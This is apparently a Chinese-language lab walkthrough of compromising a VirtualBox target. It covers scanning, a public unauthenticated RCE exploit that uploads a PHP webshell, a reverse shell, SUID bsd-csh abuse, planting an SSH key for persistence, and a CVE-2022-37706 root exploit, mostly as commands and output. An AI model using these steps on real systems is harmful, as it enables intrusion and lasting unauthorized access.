# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 06:17 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0016s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.3
Host is up (0.000096s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.4
Host is up (0.086s latency).
MAC Address: 72:10:25:EC:4F:8C (Unknown)
Nmap scan report for 192.168.21.7
Host is up (0.00017s latency).
MAC Address: 08:00:27:54:8A:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.35 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.7 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 06:28 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:54:8A:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.7  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 06:29 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
MAC Address: 08:00:27:54:8A:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.7/ -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,zip,git,jpg,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,html,txt,php,zip,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 19059]
/about.php            (Status: 200) [Size: 637]
/home.php             (Status: 200) [Size: 8979]
/login.php            (Status: 200) [Size: 1579]
/header.php           (Status: 200) [Size: 1780]
/signup.php           (Status: 200) [Size: 2034]
/admin                (Status: 301) [Size: 178] [--> http://192.168.21.7/admin/]                                                
/assets               (Status: 301) [Size: 178] [--> http://192.168.21.7/assets/]                                               
/footer.php           (Status: 200) [Size: 2862]
/css                  (Status: 301) [Size: 178] [--> http://192.168.21.7/css/]                                                  
/database             (Status: 301) [Size: 178] [--> http://192.168.21.7/database/]                                             
/readme.txt           (Status: 200) [Size: 1531]
/js                   (Status: 301) [Size: 178] [--> http://192.168.21.7/js/]                                                   
/head.php             (Status: 200) [Size: 0]
/checkout.php         (Status: 500) [Size: 0]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

这有个管理员登陆界面

<img width="1177" height="735" alt="图片" src="https://github.com/user-attachments/assets/8562bf34-4145-4064-9e44-4ae80e239ac2" />

搜索相关漏洞

```
┌──(kali㉿kali)-[~]
└─$ searchsploit online food ordering
------------------------------ ---------------------------------
 Exploit Title                |  Path
------------------------------ ---------------------------------
Online Food Ordering System 1 | php/webapps/48827.txt
Online Food Ordering System 2 | php/webapps/50305.py
Simple Online Food Ordering S | php/webapps/48829.txt
------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

尝试利用一下

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 50305            
  Exploit: Online Food Ordering System 2.0 -  Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50305
     Path: /usr/share/exploitdb/exploits/php/webapps/50305.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/50305.py
┌──(kali㉿kali)-[~]
└─$ python 50305.py
               Online Food Ordering System v2.0
            Unauthenticated Remote Code Execution
               Abdullah "hax.3xploit" Khawaja
                                                                

        ______ _______                         ________
        ___  //_/__  /_______ ___      _______ ______(_)_____ _
        __  ,<  __  __ \  __ `/_ | /| / /  __ `/____  /_  __ `/
        _  /| | _  / / / /_/ /__ |/ |/ // /_/ /____  / / /_/ /
        /_/ |_| /_/ /_/\__,_/ ____/|__/ \__,_/ ___  /  \__,_/
                                               /___/
                    abdullahkhawaja.com
            
Enter URL of The Vulnarable Application : http://192.168.21.7/
[*]Uploading PHP Shell For RCE...
[+]PHP Shell has been uploaded successfully! 
[+] Successfully connected to webshell.
CD%> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 提权

看一下都有什么

```
CD%> sudo -l

CD%> find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/bsd-csh
/usr/bin/fusermount3

CD%> /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep

CD%> cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
aelis:x:1000:1000:aelis:/home/aelis:/bin/bash
```

提权

<img width="1019" height="327" alt="图片" src="https://github.com/user-attachments/assets/f271a13c-862b-47a5-a5d1-7ae1cee0b5c2" />

提权不了，转一下再尝试提权

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.7] 34422
bash: cannot set terminal process group (484): Inappropriate ioctl for device
bash: no job control in this shell
www-data@luz:~/html/fos/assets/img$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/usr/bin/bsd-csh -b
id
uid=33(www-data) gid=33(www-data) euid=1000(aelis) egid=1000(aelis) groups=1000(aelis),33(www-data)
cd /home/aelis
ls -la
total 12168
drwxr-x--- 5 aelis aelis     4096 Jan 11  2023 .
drwxr-xr-x 3 root  root      4096 Jan 11  2023 ..
-rw------- 1 aelis aelis       49 Jan 11  2023 .Xauthority
lrwxrwxrwx 1 aelis aelis        9 Jan 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 aelis aelis      220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 aelis aelis     3771 Jan  6  2022 .bashrc
drwx------ 2 aelis aelis     4096 Jan 11  2023 .cache
drwxrwxr-x 3 aelis aelis     4096 Jan 11  2023 .local
-rw-r--r-- 1 aelis aelis      807 Jan  6  2022 .profile
drwx------ 2 aelis aelis     4096 Jan 11  2023 .ssh
-rw-r--r-- 1 aelis aelis        0 Jan 11  2023 .sudo_as_admin_successful
-rw-r--r-- 1 aelis aelis 12421945 Jan 11  2023 php-fos-db.zip
cd .ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIyH4b8Zoyqq3/IPn4Qg65OisygTuQuahWV9qPm5YovJ kali@kali' > authorized_keys
┌──(kali㉿kali)-[~/.ssh]
└─$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIyH4b8Zoyqq3/IPn4Qg65OisygTuQuahWV9qPm5YovJ kali@kali
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh aelis@192.168.21.7 -i id_ed25519
The authenticity of host '192.168.21.7 (192.168.21.7)' can't be established.
ED25519 key fingerprint is SHA256:zJ98VzyiXBPwPbYm8Ka23HQda6fosh/uoEbrEkCKYhE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.7' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of mié 23 jul 2025 15:42:39 UTC

  System load:  0.0               Processes:               108
  Usage of /:   77.2% of 7.77GB   Users logged in:         0
  Memory usage: 51%               IPv4 address for enp0s3: 192.168.21.7
  Swap usage:   0%


108 updates can be applied immediately.
56 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 12 07:30:36 2023
aelis@luz:~$ id
uid=1000(aelis) gid=1000(aelis) groups=1000(aelis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

看一下有什么

```
aelis@luz:~$ ls -la
total 12168
drwxr-x--- 5 aelis aelis     4096 ene 11  2023 .
drwxr-xr-x 3 root  root      4096 ene 11  2023 ..
lrwxrwxrwx 1 aelis aelis        9 ene 11  2023 .bash_history -> /dev/null                                                       
-rw-r--r-- 1 aelis aelis      220 ene  6  2022 .bash_logout
-rw-r--r-- 1 aelis aelis     3771 ene  6  2022 .bashrc
drwx------ 2 aelis aelis     4096 ene 11  2023 .cache
drwxrwxr-x 3 aelis aelis     4096 ene 11  2023 .local
-rw-r--r-- 1 aelis aelis 12421945 ene 11  2023 php-fos-db.zip
-rw-r--r-- 1 aelis aelis      807 ene  6  2022 .profile
drwx------ 2 aelis aelis     4096 ene 11  2023 .ssh
-rw-r--r-- 1 aelis aelis        0 ene 11  2023 .sudo_as_admin_successful
-rw------- 1 aelis aelis       49 ene 11  2023 .Xauthority
aelis@luz:~$ sudo -l
[sudo] password for aelis: 
Sorry, try again.
[sudo] password for aelis: 
Sorry, try again.
[sudo] password for aelis: 
sudo: 3 incorrect password attempts
aelis@luz:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/bsd-csh
/usr/bin/fusermount3
aelis@luz:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

<img width="1859" height="904" alt="图片" src="https://github.com/user-attachments/assets/e34f63cd-6087-467c-9594-fdc55c912116" />

提权

```
aelis@luz:~$ vim 1.sh
aelis@luz:~$ chmod +x 1.sh
aelis@luz:~$ ./1.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(aelis)
```
